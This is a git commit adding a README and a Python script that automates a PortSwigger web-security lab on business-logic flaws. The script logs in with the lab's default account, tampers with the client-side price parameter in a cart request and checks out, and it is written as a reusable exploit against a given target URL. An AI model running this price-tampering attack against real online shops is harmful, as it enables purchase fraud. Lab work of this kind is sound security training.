d474acf87a5f53b999c2ddec5a9abfa69bba3531
pentesterkaran <thakurkaran8464@gmail.com>
2024-05-29 18:05:08 +0530

    First Script Added

--- README.md
+++ README.md
@@ -1,1 +1,12 @@
-# portswigger-bussiness_login-automation-scripts
+# About Repo
+#### This is my scripts that I code for portswigger Business logic vulnerabilities labs, yes while writing this scripts I come to know some new concepts for example I come to know how to proxy your python request through burpsuite which make easy for you to debug the script.
+
+#### You can use them, May be in some scenario you have to alter some changes in scripts . So I hardly suggest to understand scripts before runnning on target .
+
+##                     Happy Hacking 💀
+
+
+##### Important : Always first start burp suite because requests have to go through burpsuite. 
+
+
+###### " test.py is a script that i use to try some changes on scripts so this is not for your use it is completely useless for you "
---
+++ script1.py
@@ -0,0 +1,85 @@
+#Problem -> Excessive trust in client side controls
+
+import requests
+import urllib3
+import sys
+from bs4 import BeautifulSoup
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+#using proxies to redirect all request through burp for easy decode in case of error
+
+proxies = {
+    "http":"http://127.0.0.1:8080",
+    "https":"http://127.0.0.1:8080"
+}
+
+#using get_csrf function to get csrf token from response 
+
+def get_csrf(s,url):
+    res = s.get(url,verify=False,proxies=proxies)
+    soup = BeautifulSoup(res.text,"html.parser")
+    csrf = soup.find("input", {'name': 'csrf'})['value']
+    return csrf
+
+#buy_jacket function is performing complete actions
+
+def buy_jacket(s,url):
+    login_url = url + "/login"
+    csrf_token = get_csrf(s,login_url)
+    data = {"csrf":csrf_token,
+            "username":"wiener",
+            "password":"peter"}
+    
+    # here we are trying to logged in application
+
+    res = s.post(login_url,data=data,verify=False,proxies=proxies)
+    if "Log out" in res.text:
+        print("[+] Successfully logged in as wiener")
+
+        # adding jacket into cart
+
+        cart_url = url + "/cart"
+        cart_data = {
+            "productId":1,
+            "redir":"PRODUCT",
+            "quantity":1,
+            "price":10
+        }
+        cart_res = s.post(cart_url,data=cart_data,verify=False,proxies=proxies)
+        
+        # finallly Buying jacket
+
+        buying_url = url + "/cart/checkout"
+        checkout_csrf = get_csrf(s,cart_url)
+        checkout_data = {
+            'csrf':checkout_csrf
+        }
+        checkout_res = s.post(buying_url,data=checkout_data,verify=False,proxies=proxies)
+
+        #checking success
+
+        if "Congratulations" in checkout_res.text:
+            print("[+] Successfully exploited Vulnerability")
+        else:
+            print("[-] Not able to exploit")
+
+
+    
+    else:
+        print("[-] Unable to logged in application")
+
+
+def main():
+    if len(sys.argv) != 2:
+        print("[-] Usage : python3 {} <target-url>".format(sys.argv[0]))
+        sys.exit(-1)
+    else:
+        s = requests.Session()
+        url = sys.argv[1]
+        buy_jacket(s,url)
+
+
+
+if __name__=="__main__":
+    main()
